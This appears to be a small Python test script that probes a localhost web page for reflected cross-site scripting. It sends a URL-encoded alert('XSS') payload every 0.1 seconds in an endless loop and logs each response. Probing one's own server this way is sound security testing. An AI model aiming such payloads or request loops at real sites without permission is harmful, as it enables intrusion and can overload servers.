import requests
import time
from datetime import datetime

# XSS payload in URL
url = "http://localhost/?param=%3Cscript%3Ealert('XSS')%3C/script%3E"

output_file = "response_log.txt"

while True:
    try:
        response = requests.get(url)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(output_file, "a") as f:
            f.write(f"[{timestamp}] Status Code: {response.status_code}\n")
            f.write(response.text + "\n\n")
        
        print(f"[{timestamp}] Request successful. Status Code: {response.status_code}")
        
    except:
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Connection failed. Retrying...")
    
    time.sleep(0.1)

